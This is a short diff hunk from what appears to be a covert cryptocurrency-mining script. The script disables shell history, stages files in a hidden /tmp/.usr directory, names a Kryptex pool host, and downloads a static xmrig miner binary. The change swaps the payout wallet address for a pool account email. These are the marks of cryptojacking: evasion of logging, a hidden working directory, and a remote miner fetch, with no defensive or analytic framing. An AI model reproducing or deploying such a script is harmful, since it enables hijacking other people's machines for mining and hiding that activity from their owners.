@@ -6,7 +6,7 @@ set +o history
 HOST="zeph.kryptex.network"
 
 ROOT_path="/tmp/.usr"
-wallet="ZEPHYR3CsXhCWhVERSvRJeHV6NFbvQ6kiJMBdCY6uNAG6vajeopVuXBdKh1QPYvUh5K5i38stfwRjbbshxDaFBNSU16xiu1ifnt1o"
+wallet="snake9411@proton.me"
 xmrig_url="https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-2/xmrig-6.21.2-linux-static-x64.tar.gz"
 random_number=$(shuf -i 10000000-99999999 -n 1)
 command=""
